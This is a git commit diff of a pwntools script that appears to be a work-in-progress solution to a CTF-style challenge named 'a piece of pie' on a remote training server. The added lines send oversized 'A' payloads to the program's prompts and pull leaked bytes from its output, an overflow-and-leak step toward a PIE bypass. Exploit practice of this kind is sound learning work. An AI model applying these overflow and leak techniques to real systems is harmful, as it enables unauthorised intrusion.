8cbdf68ebf62ede6ffc820296ca3aa5ea06bc2c2
Brian <hibrian827@gmail.com>
2024-03-30 20:05:31 +0900

    solving a piece of pie

--- WHS/main.py
+++ WHS/main.py
@@ -1,6 +1,6 @@
 from pwn import *
 
-port =  9817
+port =  9095
 rem = remote("srv1.kitriwhs.kr", port)
 
 elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
@@ -12,11 +12,14 @@ elf.address = 5000
 print(elf.address)
 print(elf.symbols["gadget"])
 
-# rem.sendlineafter(b"name: ", b"A" * 0xa0)
-# print(rem.recvline())
+payload = b"A" * 0x120
+rem.sendlineafter(b"name: ", payload)
+print(len(rem.recvline()))
 
-# rem.sendlineafter(b"1: ", b"A")
-# print(rem.recvline())
-# rem.sendlineafter(b"2: ", b"A")
-# print(rem.recvline())
-# rem.sendlineafter(b"3: ", b"A")
+# print(''.join('%02x' % ord(c) for c in "\xf9*\xd7\xfa\xfc\x7f"))
+
+rem.sendlineafter(b"1: ", payload)
+print(rem.recvline())
+rem.sendlineafter(b"2: ", payload)
+print(rem.recvline().hex()[-14 : -2])
+rem.sendlineafter(b"3: ", payload)
